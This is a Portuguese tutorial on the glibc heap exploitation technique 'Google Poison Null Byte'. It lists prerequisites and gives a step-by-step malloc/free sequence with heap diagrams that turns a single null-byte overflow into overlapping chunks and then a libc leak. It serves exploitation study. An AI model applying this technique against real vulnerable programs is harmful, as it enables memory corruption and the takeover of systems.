# Google Poison Null Byte

- [Google Poison Null Byte](#google-poison-null-byte)
- [Prerrequisitos](#prerrequisitos)
- [Ataque](#ataque)

Essa tecnica se parece com a House of Einherjar, porem nela nos 
precisávamos usar null bytes no `prev_size` e dado que overflows 
de Null Byte tendem a ocorres com strings, nos nao poderíamos 
usa-los.

Assim, essa tecnica é mais realista, ja que leva badchars em 
consideração. Portanto, ela ja foi usada em múltiplos ataques na 
vida real.

Alem disso, eles se diferenciam pois nessa tecnica o nosso Null 
byte corrompe o `size` de um `FREE chunk`... Portanto, essa 
tecnica busca criar um overlap entre dois chunks

# Prerrequisitos 
Os prerrequisitos dessa tecnica para o chunk vitima sao o sao o 
oposto da House of Einherjar:

- chunk overflow
  - Qualquer size 
  - overflow de 1 Null Byte 
- chunk vitima 
  - FREE 
  - `size` > `0x100`
  - `size` **NAO!!!** terminado em `0x00`. Ex: `0x410`, `0x3a0`... 
- chunk consolidação
  - Tamanho que permita consolidação: `size` >= `0x90`
- Um chunk qualquer para prevenir consolidação com o TOP

# Ataque

```py
chunk_A = malloc(0x18)  # chunk overflow: qualquer tamanho 
chunk_B = malloc(0x308) # chunk vitima: 0x310 
chunk_C = malloc(0x98)  # chunk consolidação: size >= 0x90
chunk_D = malloc(0x98)  # Prevenir consolidação TOP

free(chunk_B)


OBS: Caso o libc tenha "prev vs prev size" (> 2.26) :
  Precisaríamos forjar um PREV_SIZE falso pro chunk_B
  (ele deve ficar na posição do prev_size caso o chunk_B ja 
  tivesse sido reduzido (pad = 0x300-0x10))

  edit(chunk_B, "\x00"*0x2f0 + p16(0x300))
  free(chunk_B)

Para simplificar, vamos assumir uma versão mais antiga do libc
  

 _______________  chunk_A
|               |
|               |
|_______________| chunk_B
|       | 0x311 |  FREE: UNSORTED
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

edit(chunk_A, 0x18*b"A")  # vamos assumir que o programa coloque o 
                          # NULL ao final automaticamente

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B
| AAAAA | 0x300 |  FREE: UNSORTED
|               |  SIZE ALTERADO PARA 0x300 (-0x10)
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Assim, o chunk vitima teve seu tamanho diminuído em: mod 0x100

Vamos chamar essa diferença de DIFF

Por exemplo: 
  0x310 -> 0x300    DIFF=0x10
  0X4a0 -> 0x400    DIFF=0xa0
  ...               DIFF=(size mod 0x100)

Essa diferença ira gerar muitos problemas!

Agora, vamos alocar um chunk que divida o B por meio de remainder

chunk_B1 = malloc(0xf8) # 0x100 por exemplo, mas poderia ser também
                        # 0x110, 0x120, ..., 0x200,...

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | 
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| resto do chunk_B
|       | 0x201 | FREE: UNSORTED
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |       |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|


Nao atualizou o prev_size do chunk_C como deveria, pois
deu write num endereço 0x10 (DIFF) antes do correto  
(Justamente no Espaço bugado de tamanho DIFF)

Então o prev_size do chunk_C continua = 0x310


Agora, vamos alocar um chunk que gaste o "resto do chunk_B"

chunk_B2 = malloc(0x1f8) # 0x200

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | 
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_B2
|       | 0x201 |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |   1   |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Assim como no anterior, errou a mira por 0x10 (DIFF)!

Dessa vez, nao atualiza o PREV_IN_USE do C


Portanto, por causa do PREV_USE e PREV_SIZE errados, 
se free(chunk_C), ele vai consolidar com chunk_B1 (que tem o mesmo 
endereço que o chunk_B), pois acredita que ele esta FREE


Assim, teríamos que forjar fd e bk no chunk_B1, para que ele 
passe o safe unlink! Mas nos precisaríamos de um heap leak e 
da habilidade de escrever NULLBYTES 

Para burlar isso, vamos simplesmente dar free() nele, gerando 
pointers legítimos

free(chunk_B1)

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | FREE: UNSORTED
|   FD  |   BK  | FD e BK legítimos
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_B2
|       | 0x200 | PREV_USE = 0 (porem nao importa)
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |   1   |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Agora podemos chamar free no chunk_C, consolidando com o chunk_B1

free(chunk_C)

Da perspectiva do MALLOC temos:
 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1 + chunk_C
| AAAAA | 0x401 | FREE: UNSORTED
|   FD  |   BK  | 
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Porem nos sabemos que o chunk_B2 continua ali! Criando um overlap

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1 + chunk_C
| AAAAA | 0x401 | FREE: UNSORTED
|   FD  |   BK  | 
|               |
|               |
|               |
|               |
|               |
|. . . . . . . .| chunk_B2               
|               |
|               |
|               |
|               | 
|               |
|               |
|               |
|               |
|. . . . . . . .|
|               |
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

E lembrando que, a nao ser que CALLOC tenha sido usado, ainda 
existe um monte de metadados largados la no meio (por exemplo, no 
espaço DIFF), ou os próprios pointers do chunk_B2

```

Agora com esse primitivo, voce poderia fazer muitas coisas, 
por exemplo, um libc leak: 
- `chunk_E` = `malloc`(`size chunk_B1`)
- `read`(`chunk_B2`)
